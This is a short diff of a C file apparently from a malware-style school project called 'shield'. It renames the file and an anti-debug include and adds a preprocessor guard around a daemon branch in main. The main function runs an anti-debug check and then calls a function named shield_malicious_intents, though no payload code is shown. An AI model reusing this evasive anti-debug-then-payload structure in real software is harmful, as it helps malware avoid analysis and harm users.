@@ -1,12 +1,12 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   main.c                                             :+:      :+:    :+:   */
+/*   main.cc                                            :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: kiroussa <oss@xtrm.me>                     +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2025/03/23 01:58:58 by kiroussa          #+#    #+#             */
-/*   Updated: 2025/11/28 22:24:06 by kiroussa         ###   ########.fr       */
+/*   Updated: 2025/11/29 00:11:05 by kiroussa         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -15,7 +15,7 @@
 #include <stdio.h>
 #include <signal.h>
 #include <unistd.h>
-#include "antidebug.inc.c"
+#include "antidebug.inc.cc"
 
 #include <shield/le_function.h>
 #include <errno.h>
@@ -130,8 +130,10 @@ int	main(void)
 	if (shield_antidebug())
 	{
 		DEBUG("passed anti-debug check\n");
+#if !MATT_MODE
 		if (shield_is_flipped())
 			return (shield_daemon_main(), 0);
+#endif // !MATT_MODE
 		shield_malicious_intents();
 		DEBUG("done\n");
 	}
